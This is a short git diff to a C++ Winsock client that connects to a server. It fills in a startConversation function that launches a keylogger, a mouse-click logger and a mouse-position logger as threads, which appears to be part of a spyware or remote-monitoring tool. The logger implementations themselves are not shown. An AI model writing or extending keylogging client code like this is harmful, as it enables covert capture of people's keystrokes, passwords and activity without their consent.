@@ -1,5 +1,4 @@
 #define _WINSOCK_DEPRECATED_NO_WARNINGS
-
 #include "Client.h"
 
 
@@ -40,7 +39,18 @@ void Client::connectToServer(std::string serverIP, int port)
         throw std::exception("Cant connect to server");
 }
 
+
+// function runs all of the loggers - as threads
 void Client::startConversation()
 {
-    
+    KeyLogger* kl = new KeyLogger();
+    MouseLogger* ml = new MouseLogger();
+
+    std::vector<std::thread> inputsThreads;
+    inputsThreads.push_back(std::thread(&KeyLogger::recordKeyboard, kl));
+    inputsThreads.push_back(std::thread(&MouseLogger::recordMouseClicks, ml));
+    inputsThreads.push_back(std::thread(&MouseLogger::recordMousePos, ml));
+
+    for (int i = 0; i < inputsThreads.size(); i++)
+        inputsThreads[i].join();
 }
